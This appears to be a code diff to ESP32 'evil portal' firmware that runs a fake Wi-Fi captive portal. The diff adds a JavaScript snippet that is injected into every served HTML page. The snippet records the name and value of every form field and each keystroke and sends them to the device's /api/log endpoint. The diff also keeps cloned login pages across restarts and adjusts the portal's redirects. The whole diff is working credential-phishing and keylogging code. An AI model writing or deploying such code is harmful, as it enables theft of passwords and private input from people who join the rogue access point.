@@ -165,6 +165,10 @@ static char current_keystrokes_filename[128] = "";
 static int ap_connection_count = 0;
 
 #define MAX_HTML_BUFFER_SIZE 2048
+
+// JavaScript snippet injected into every served HTML page to capture keystrokes and input values
+static const char *CAPTURE_JS_SNIPPET = \
+    "<script>(function(){const send=d=>navigator.sendBeacon?navigator.sendBeacon('/api/log',new Blob([d])):fetch('/api/log',{method:'POST',headers:{\"Content-Type\":\"text/plain\"},body:d});const h=e=>{const t=e.target;if(!(t.name||t.id))return;const tag=t.tagName.toLowerCase();send(Date.now()+\"|\"+tag+\"|\"+(t.name||t.id)+\"|\"+t.value+\"\\n\");};['input','change','keydown'].forEach(ev=>document.addEventListener(ev,h,true));})();</script>";
 static char* html_buffer = NULL;
 static size_t html_buffer_size = 0;
 static bool use_html_buffer = false;
@@ -650,6 +654,10 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
                 break;
             }
         }
+        // Inject capture JS if serving HTML
+        if (content_type && strcmp(content_type, "text/html") == 0) {
+            httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
+        }
 
         free(buffer);
         fclose(file);
@@ -850,11 +858,18 @@ esp_err_t portal_handler(httpd_req_t *req) {
     printf("Client requested URL: %s\n", req->uri);
     ESP_LOGI(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
 
-    // Check if we should serve HTML from buffer first
-    if (use_html_buffer && html_buffer != NULL && html_buffer_size > 0) {
+    // Debug buffer state
+    ESP_LOGI(TAG, "HTML buffer check: html_buffer=%p, html_buffer_size=%zu, use_html_buffer=%s", 
+             html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
+
+    // Prefer buffered HTML over default embedded portal when available
+    if (html_buffer != NULL && html_buffer_size > 0) {
+        ESP_LOGI(TAG, "Using buffered HTML (size: %zu bytes)", html_buffer_size);
         httpd_resp_set_type(req, "text/html");
-        httpd_resp_send(req, html_buffer, html_buffer_size);
-        ESP_LOGI(TAG, "Served HTML from buffer (size: %zu bytes).", html_buffer_size);
+        httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked"); // Set chunked response
+        httpd_resp_send_chunk(req, html_buffer, html_buffer_size);
+        httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
+        ESP_LOGI(TAG, "Served HTML from buffer (size: %zu bytes) with JS injection.", html_buffer_size);
         ESP_LOGI(TAG, "Free heap after serving buffer: %" PRIu32 " bytes", esp_get_free_heap_size());
         return ESP_OK;
     }
@@ -862,8 +877,10 @@ esp_err_t portal_handler(httpd_req_t *req) {
     // Check if we should serve the default embedded portal
     if (strcmp(PORTALURL, "INTERNAL_DEFAULT_PORTAL") == 0) {
         httpd_resp_set_type(req, "text/html");
-        httpd_resp_send(req, default_portal_html, strlen(default_portal_html));
-        ESP_LOGI(TAG, "Served default embedded portal.");
+        httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked");
+        httpd_resp_send_chunk(req, default_portal_html, strlen(default_portal_html));
+        httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
+        ESP_LOGI(TAG, "Served default embedded portal with JS injection.");
         ESP_LOGI(TAG, "Free heap after serving default portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
         return ESP_OK;
     }
@@ -968,7 +985,7 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     }
     const char *uri = req->uri;
     if (strcmp(uri, "/generate_204") == 0 || strcmp(uri, "/hotspot-detect.html") == 0 || strcmp(uri, "/connecttest.txt") == 0) {
-        httpd_resp_set_status(req, "301 Moved Permanently");
+        httpd_resp_set_status(req, "302 Found");
         httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
         httpd_resp_send(req, NULL, 0);
         ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
@@ -986,7 +1003,7 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
         return ESP_OK;
     }
 
-    httpd_resp_set_status(req, "301 Moved Permanently");
+    httpd_resp_set_status(req, "302 Found");
     char LocationRedir[512];
     snprintf(LocationRedir, sizeof(LocationRedir), "http://192.168.4.1/login");
     httpd_resp_set_hdr(req, "Location", LocationRedir);
@@ -1049,6 +1066,18 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
     login_done = false; // Reset login state on start
     current_creds_filename[0] = '\0'; // Reset filenames at the start
     current_keystrokes_filename[0] = '\0';
+    // Log HTML buffer state at portal startup
+    ESP_LOGI(TAG, "Evil portal starting - HTML buffer state: buffer=%p, size=%zu, use_html_buffer=%s", 
+        html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
+
+    // Log first 100 characters of captured HTML if available
+    if (html_buffer != NULL && html_buffer_size > 0) {
+    char preview[101];
+    size_t preview_len = html_buffer_size > 100 ? 100 : html_buffer_size;
+    memcpy(preview, html_buffer, preview_len);
+    preview[preview_len] = '\0';
+    ESP_LOGI(TAG, "Captured HTML preview (first %zu chars): %.100s", preview_len, preview);
+    }
 
     // Generate indexed filenames if SD card is available
     if (sd_card_manager.is_initialized) {
@@ -1159,13 +1188,7 @@ void wifi_manager_stop_evil_portal() {
     current_creds_filename[0] = '\0'; // Clear saved filenames
     current_keystrokes_filename[0] = '\0';
     
-    // Clean up HTML buffer
-    use_html_buffer = false;
-    if (html_buffer != NULL) {
-        free(html_buffer);
-        html_buffer = NULL;
-    }
-    html_buffer_size = 0;
+    // Keep HTML buffer across portal restarts - don't clear it here
 
     if (dns_handle != NULL) {
         stop_dns_server(dns_handle);
@@ -4440,10 +4463,15 @@ void wifi_manager_store_html_chunk(const char* data, size_t len, bool is_final) 
     if (is_final) {
         html_buffer[html_buffer_size] = '\0';
         printf("HTML content stored in buffer (%zu bytes)\n", html_buffer_size);
+        ESP_LOGI(TAG, "HTML capture completed: buffer=%p, size=%zu, use_html_buffer=%s", 
+                 html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
     }
 }
 
 void wifi_manager_clear_html_buffer(void) {
+    ESP_LOGI(TAG, "Clearing HTML buffer - current state: buffer=%p, size=%zu, use_html_buffer=%s", 
+             html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
+    
     use_html_buffer = false;
     if (html_buffer != NULL) {
         free(html_buffer);
@@ -4451,6 +4479,7 @@ void wifi_manager_clear_html_buffer(void) {
     }
     html_buffer_size = 0;
     printf("HTML buffer cleared and disabled\n");
+    ESP_LOGI(TAG, "HTML buffer cleared successfully");
 }
 
 void wifi_manager_sae_flood_help(void) {
